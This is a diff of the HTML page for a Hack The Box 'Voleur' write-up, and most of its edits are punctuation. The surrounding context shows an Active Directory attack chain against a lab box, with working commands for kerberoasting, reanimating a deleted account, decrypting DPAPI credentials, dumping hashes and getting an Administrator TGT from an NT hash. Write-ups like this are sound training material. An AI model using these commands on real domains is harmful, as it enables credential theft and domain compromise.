@@ -54,7 +54,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-voleur/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -204,7 +204,7 @@ stroke-linejoin="round" class="feather feather-home">
                 <p>Windows AD box where NTLM authentication is completely disabled. That single constraint changes everything about how you operate: no pass-the-hash, no NTLM relay, every tool needs a TGT and Kerberos must be properly configured. The box hands you starting credentials upfront but then makes you earn the rest through a chain that&rsquo;s worth understanding. A spreadsheet locked in an SMB share leaks passwords for accounts you can&rsquo;t use yet. A service account with WriteSPN lets you kerberoast your way to WinRM. A group called Restore_Users hints at a deleted employee. And once you bring that employee back from tombstone, his archived DPAPI blobs hand you the next account&rsquo;s credentials without any cracking at all.</p>
 <p>&ldquo;Voleur&rdquo; is French for thief. Appropriate.</p>
 <h2 id="recon">Recon</h2>
-<p>10.129.232.130, domain <code>voleur.htb</code>, hostname <code>DC</code>. Standard AD ports: DNS, Kerberos, LDAP, SMB, WinRM on 5985. Also an SSH server on port 2222, running OpenSSH on Ubuntu - WSL, as it turns out.</p>
+<p>10.129.232.130, domain <code>voleur.htb</code>, hostname <code>DC</code>. Standard AD ports: DNS, Kerberos, LDAP, SMB, WinRM on 5985. Also an SSH server on port 2222, running OpenSSH on Ubuntu. WSL, as it turns out.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
 </span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-07 07:32 +0100
 </span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.232.130
@@ -273,7 +273,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Using kerberos auth from ccache
 </span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Done in 0M 17S
 </span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Compressing output into /home/kanyo/.nxc/logs/DC_voleur.htb_2026-06-07_161131_bloodhound.zip
-</span></span></code></pre></div><p>Ryan is a member of First-Line Technicians - a custom group, which usually means it has some permission wired to it.</p>
+</span></span></code></pre></div><p>Ryan is a member of First-Line Technicians, a custom group, which usually means it has some permission wired to it.</p>
 <p><img src="/images/writeups/htb-voleur/bloodhound-ryan-first-line-technicians.png" alt="BloodHound graph showing RYAN.NAYLOR is MemberOf FIRST-LINE TECHNICIANS and DOMAIN USERS groups"></p>
 <h2 id="the-spreadsheet-in-the-it-share">The Spreadsheet in the IT Share</h2>
 <p>First-Line Technicians group gave read access to the IT share. Listing shares as ryan via Kerberos:</p>
@@ -380,11 +380,11 @@ stroke-linejoin="round" class="feather feather-home">
       </tr>
   </tbody>
 </table>
-<p>A few things jump out immediately. <code>svc_ldap</code> has a plaintext password. <code>Todd.Wolfe</code> is flagged as a leaver with his account &ldquo;deleted&rdquo; - and we already have his password. BloodHound showed exactly what <code>svc_ldap</code> can do with those credentials:</p>
+<p>A few things jump out immediately. <code>svc_ldap</code> has a plaintext password. <code>Todd.Wolfe</code> is flagged as a leaver with his account &ldquo;deleted,&rdquo; and we already have his password. BloodHound showed exactly what <code>svc_ldap</code> can do with those credentials:</p>
 <p><img src="/images/writeups/htb-voleur/bloodhound-svcldap-restore-users-chain.png" alt="BloodHound graph showing SVC_LDAP is MemberOf RESTORE_USERS which has GenericWrite over LACEY.MILLER and the SECOND-LINE SUPPORT OU, and SVC_LDAP has WriteSPN over SVC_WINRM"></p>
 <p>Two paths: <code>svc_ldap</code> has <code>WriteSPN</code> directly on <code>svc_winrm</code>, and via <code>Restore_Users</code> group membership it has <code>GenericWrite</code> over <code>lacey.miller</code> and the Second-Line Support Technicians OU. The group name &ldquo;Restore_Users&rdquo; combined with Todd&rsquo;s deleted account was a strong signal.</p>
 <h2 id="targeted-kerberoasting-via-writespn">Targeted Kerberoasting via WriteSPN</h2>
-<p>WriteSPN is an AD permission that lets you add or modify a user account&rsquo;s <code>servicePrincipalName</code> attribute. This matters because the Kerberos protocol treats any account with an SPN as a service. When you request a TGS ticket for a service, the KDC encrypts part of the response with that account&rsquo;s password hash. That encrypted blob is the kerberoastable hash - you take it offline and crack it.</p>
+<p>WriteSPN is an AD permission that lets you add or modify a user account&rsquo;s <code>servicePrincipalName</code> attribute. This matters because the Kerberos protocol treats any account with an SPN as a service. When you request a TGS ticket for a service, the KDC encrypts part of the response with that account&rsquo;s password hash. That encrypted blob is the kerberoastable hash. You take it offline and crack it.</p>
 <p><code>svc_ldap</code> has WriteSPN over <code>svc_winrm</code>. That means I can register a fake SPN on svc_winrm, request a TGS for it, and get a crackable hash. First I needed a TGT as svc_ldap:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py voleur.htb/svc_ldap:<span class="s1">&#39;M1XyC9pW7qT5Vn&#39;</span>
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
@@ -443,9 +443,9 @@ Status...........: Exhausted
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
 Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...d5f118
 </code></pre><p>Exhausted. Lacey&rsquo;s password wasn&rsquo;t in rockyou. There&rsquo;s no ADCS on this box either, so shadow credentials are off the table. Dead end.</p>
-<p>The group name &ldquo;Restore_Users&rdquo; plus Todd&rsquo;s flagged-as-deleted account in the spreadsheet - that was the real path.</p>
+<p>The group name &ldquo;Restore_Users&rdquo; plus Todd&rsquo;s flagged-as-deleted account in the spreadsheet, that was the real path.</p>
 <h2 id="reanimate-tombstone-bringing-todd-back">Reanimate-Tombstone: Bringing Todd Back</h2>
-<p>I covered tombstone reanimation in detail in the <a href="/writeups/htb-tombwatcher/">TombWatcher writeup</a> - same mechanic, different path to it. Short version: when an account is deleted in Active Directory it doesn&rsquo;t disappear immediately. AD moves it to <code>CN=Deleted Objects</code> and strips most of its attributes, but keeps the object&rsquo;s SID and <code>sAMAccountName</code> for a configurable period (the <code>msDS-deletedObjectLifetime</code>, default 180 days). This is called a tombstone. The Reanimate-Tombstones extended right, when granted on the domain root or a specific OU, lets a principal restore a tombstoned object back to its original location with its SID intact.</p>
+<p>I covered tombstone reanimation in detail in the <a href="/writeups/htb-tombwatcher/">TombWatcher writeup</a>, same mechanic, different path to it. Short version: when an account is deleted in Active Directory it doesn&rsquo;t disappear immediately. AD moves it to <code>CN=Deleted Objects</code> and strips most of its attributes, but keeps the object&rsquo;s SID and <code>sAMAccountName</code> for a configurable period (the <code>msDS-deletedObjectLifetime</code>, default 180 days). This is called a tombstone. The Reanimate-Tombstones extended right, when granted on the domain root or a specific OU, lets a principal restore a tombstoned object back to its original location with its SID intact.</p>
 <p>The <code>Restore_Users</code> group has that right. <code>svc_ldap</code> is a member. Let me query deleted objects using the LDAP control OID <code>1.2.840.113556.1.4.2064</code> (the &ldquo;show deleted objects&rdquo; control):</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb get search -c 1.2.840.113556.1.4.2064 <span class="se">\
 </span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(isDeleted=TRUE)&#39;</span> --attr name
@@ -456,7 +456,7 @@ Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...d5f118
 </span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Todd Wolfe<span class="se">\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb
 </span></span><span class="line"><span class="cl">name: Todd Wolfe
 </span></span><span class="line"><span class="cl">DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
-</span></span></code></pre></div><p>Todd is there. Get his SID - restoration by SID is more reliable than by name when multiple tombstones exist:</p>
+</span></span></code></pre></div><p>Todd is there. Get his SID. Restoration by SID is more reliable than by name when multiple tombstones exist:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb get search -c 1.2.840.113556.1.4.2064 <span class="se">\
 </span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(sAMAccountName=todd.wolfe)&#39;</span> --attr sAMAccountName,distinguishedName,objectSid
 </span></span><span class="line"><span class="cl"> 
@@ -490,8 +490,8 @@ Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...d5f118
 </span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">740</span>  Wed Jan <span class="m">29</span> 14:09:25 <span class="m">2025</span> 08949382-134f-4c63-b93c-ce52efc0aa88
 </span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">900</span>  Wed Jan <span class="m">29</span> 13:53:08 <span class="m">2025</span> BK-VOLEUR
 </span></span><span class="line"><span class="cl">-rw-rw-rw-         <span class="m">24</span>  Wed Jan <span class="m">29</span> 13:53:08 <span class="m">2025</span> Preferred
-</span></span></code></pre></div><p>These are standard Windows DPAPI artifacts. When a user saves credentials through Windows Credential Manager - logging into a network share, saving a password for an RDP connection, anything like that - Windows encrypts the credential blob using the user&rsquo;s DPAPI master key. The master key itself is derived from the user&rsquo;s password (via their NT hash) and their SID. The encrypted blobs live at <code>AppData\Roaming\Microsoft\Credentials\</code> and the master keys at <code>AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\</code>.</p>
-<p>When Todd was tombstoned, his Windows profile was archived to the IT share rather than wiped. That was the mistake - the archive included his entire DPAPI state: the credential blob containing Jeremy&rsquo;s saved password, and the master key needed to decrypt it.</p>
+</span></span></code></pre></div><p>These are standard Windows DPAPI artifacts. When a user saves credentials through Windows Credential Manager, logging into a network share, saving a password for an RDP connection, anything like that, Windows encrypts the credential blob using the user&rsquo;s DPAPI master key. The master key itself is derived from the user&rsquo;s password (via their NT hash) and their SID. The encrypted blobs live at <code>AppData\Roaming\Microsoft\Credentials\</code> and the master keys at <code>AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\</code>.</p>
+<p>When Todd was tombstoned, his Windows profile was archived to the IT share rather than wiped. That was the mistake. The archive included his entire DPAPI state: the credential blob containing Jeremy&rsquo;s saved password, and the master key needed to decrypt it.</p>
 <p>Decrypt the master key offline using Todd&rsquo;s password:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password <span class="s1">&#39;NightT1meP1dg3on14&#39;</span>
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
@@ -522,7 +522,7 @@ Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...d5f118
 </span></span><span class="line"><span class="cl">Unknown     : 
 </span></span><span class="line"><span class="cl">Username    : jeremy.combs
 </span></span><span class="line"><span class="cl">Unknown     : qT3V9pLXyN7W4m
-</span></span></code></pre></div><p><code>jeremy.combs:qT3V9pLXyN7W4m</code>. Todd had saved Jeremy&rsquo;s credentials in Credential Manager at some point - maybe to access a shared resource, maybe to test a service. Windows encrypted them silently. When Todd got deleted and his profile archived, those credentials came along for the ride.</p>
+</span></span></code></pre></div><p><code>jeremy.combs:qT3V9pLXyN7W4m</code>. Todd had saved Jeremy&rsquo;s credentials in Credential Manager at some point, maybe to access a shared resource, maybe to test a service. Windows encrypted them silently. When Todd got deleted and his profile archived, those credentials came along for the ride.</p>
 <h2 id="jeremy-the-ssh-key-and-the-backup">Jeremy, the SSH Key, and the Backup</h2>
 <p>The spreadsheet noted Jeremy had access to the Software folder. Kinit as Jeremy and look at the IT share:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ kinit jeremy.combs
@@ -558,7 +558,7 @@ Please see what you can set up.
 Thanks,
 
 Admin
-</code></pre><p>Port 2222 from the nmap. <code>svc_backup</code> with that SSH key. The note explains what the Linux SSH is for - WSL is configured on the DC to run Linux binaries against the Windows filesystem.</p>
+</code></pre><p>Port 2222 from the nmap. <code>svc_backup</code> with that SSH key. The note explains what the Linux SSH is for. WSL is configured on the DC to run Linux binaries against the Windows filesystem.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svc_backup@DC:~$ sudo -l
 </span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> svc_backup on DC:
 </span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
@@ -640,7 +640,7 @@ Admin
 </span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
 </span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:des-cbc-md5:32b61fb92a7010ab
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
-</span></span></code></pre></div><p>Administrator NT hash. Because NTLM is disabled, I can&rsquo;t use it directly for pass-the-hash over SMB or WinRM. But I can use it to get a Kerberos TGT - the KDC will accept the NT hash to derive the AS-REP encryption key:</p>
+</span></span></code></pre></div><p>Administrator NT hash. Because NTLM is disabled, I can&rsquo;t use it directly for pass-the-hash over SMB or WinRM. But I can use it to get a Kerberos TGT. The KDC will accept the NT hash to derive the AS-REP encryption key:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/voleur/Backups ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 </span></span><span class="line"><span class="cl">
@@ -774,6 +774,11 @@ Admin
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
